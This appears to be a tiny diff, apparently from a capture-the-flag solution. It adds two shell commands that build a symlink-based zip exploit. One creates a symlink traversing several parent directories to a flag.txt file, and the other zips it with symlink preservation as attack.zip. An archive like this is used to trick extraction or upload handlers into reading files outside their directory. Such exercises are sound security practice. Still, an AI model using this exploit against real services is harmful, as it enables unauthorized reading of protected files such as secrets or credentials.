@@ -1,0 +1,2 @@
+ln -s ../../../../../flag.txt link2flag
+zip -y attack.zip link2flag
